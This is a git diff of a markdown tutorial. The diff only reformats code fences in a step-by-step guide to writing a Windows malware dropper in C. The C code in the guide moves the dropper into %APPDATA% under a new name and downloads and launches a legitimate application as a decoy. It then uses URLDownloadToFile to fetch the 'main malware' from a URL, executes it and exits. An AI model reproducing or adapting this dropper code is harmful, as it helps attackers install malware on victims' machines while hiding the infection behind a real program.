@@ -17,18 +17,18 @@ Let's start with defining the needed parameters for this function:
 
 Now, let's defining some variables we will be using when downloading & grabbing the legitimate application:
 
-`
+```
 TCHAR current_dir[MAX_PATH]
 
 TCHAR current_file[MAX_PATH]
 
 TCHAR new_dir[MAX_PATH]
-`
+```
 * current_dir will be used to grab the current directory & append the legitimate_app string to the end of it to build the location to drop the legitimate piece of software.
 * current_file will store the current directory & name of the dropper. This will be the first parameter of the **MoveFileA** function
 * new_dir will be used to build the location where the dropper will be moved to. This will be the 2nd parameter of the **MoveFileA** function
 
-`
+```
 GetCurrentDirectory(MAX_PATH, current_dir);
 
 strcat_s(current_dir, strlen(current_dir)+strlen(legitimate_app)+1, legitimate_app);
@@ -40,7 +40,7 @@ GetEnvironmentVariable("APPDATA", new_dir, MAX_PATH);
 strcat_s(new_dir, strlen(new_dir)+strlen(dropper_new_name)+1,dropper_new_name);
 
 int mresult = MoveFileA(current_file, new_dir);
-`
+```
 
 1. This will store the current directory in current_dir 
 2. This will concatenate the legitimate_app variable (the legitimate application's filename) to the current_dir variable
@@ -49,7 +49,7 @@ int mresult = MoveFileA(current_file, new_dir);
 5. the dropper's new file name is then concatenated to the new_dir variable
 6. Then we move the dropper to the new directory which is %APPDATA% & rename it to whatever dropper_new_name is set to
 
-`
+```
 HRESULT filedl = URLDownloadToFile(NULL, legitimate_app_URL, current_dir, 0, NULL);
 
 if (filedl == S_OK) {
@@ -63,7 +63,7 @@ else {
 	printf("[!] Error with download\n");
 
 }
-`
+```
 
 Here we are simply downloading the legitimate application from the legitimate_app_URL variable & saving it to wherever current_dir points to. If the download is successful, we execute the legitimate software.
 
@@ -73,15 +73,15 @@ The only variable we define here is:
 `TCHAR maldir[MAX_PATH];`
 which will be used to store the full directory of the malware being dropped.
 
-`
+```
 GetEnvironmentVariable("APPDATA", maldir, MAX_PATH);
 
 strcat_s(maldir, strlen(maldir)+strlen(malware_app)+1, malware_app);
-`
+```
 1. Grabbing environment variable of APPDATA & storing it in maldir
 2. Appending the desired file name of the malware that gets dropped to the maldir variable, creating a full path
 
-`
+```
 HRESULT maldl = URLDownloadToFile(NULL, malware_URL, maldir, 0, NULL);
 
 if (maldl == S_OK) {
@@ -98,7 +98,8 @@ else {
 	printf("[!] Error downloading main malware\n");
 
 }
-`
+```
+
 This is a repeat of earlier code, we're simply downloading the malware from the URL stored in malware_URL & saving it to the path stored in maldir. If the download succeeds, we execute it & then exit the dropper.
 
 ## Cross-Compilation
